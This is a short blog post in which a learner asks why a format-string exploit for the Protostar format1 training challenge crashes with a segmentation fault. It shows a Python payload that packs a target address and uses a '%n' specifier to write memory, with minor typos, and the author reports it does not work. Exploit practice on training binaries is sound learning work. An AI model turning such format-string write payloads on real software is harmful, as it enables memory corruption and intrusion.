---
layout: post
title: "Protostar format01 error"
tags: [protostar]
comments: true
---


I have the following exploit

```
/opt/protostar/bin/format1 (python ex.py)

```

python code
```
mport struct

payload = struct.pack("I", 0x08049638)
payload += " %132$08n"
print(payload)
~               
```

This should work but it's only returning Segmentation falt.

Any idea why?
